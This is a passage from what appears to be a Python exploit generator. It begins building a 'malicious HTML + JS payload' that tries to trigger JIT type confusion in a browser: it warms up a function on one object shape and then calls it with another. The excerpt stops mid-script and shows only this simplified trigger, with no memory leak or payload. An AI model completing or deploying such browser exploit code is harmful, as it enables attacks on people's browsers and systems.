        """Generates the malicious HTML + JS payload."""
        # Simplified JIT type confusion trigger
        js_exploit = """
        <script>
        function trigger() {
            function leak(obj) {
                return obj.a;
            }

            let o1 = {a: 1.1};
            for (let i = 0; i < 10000; i++) leak(o1); // Warm up JIT

            // Change object structure
            let o2 = {b: 2.2};
            let result = leak(o2); 

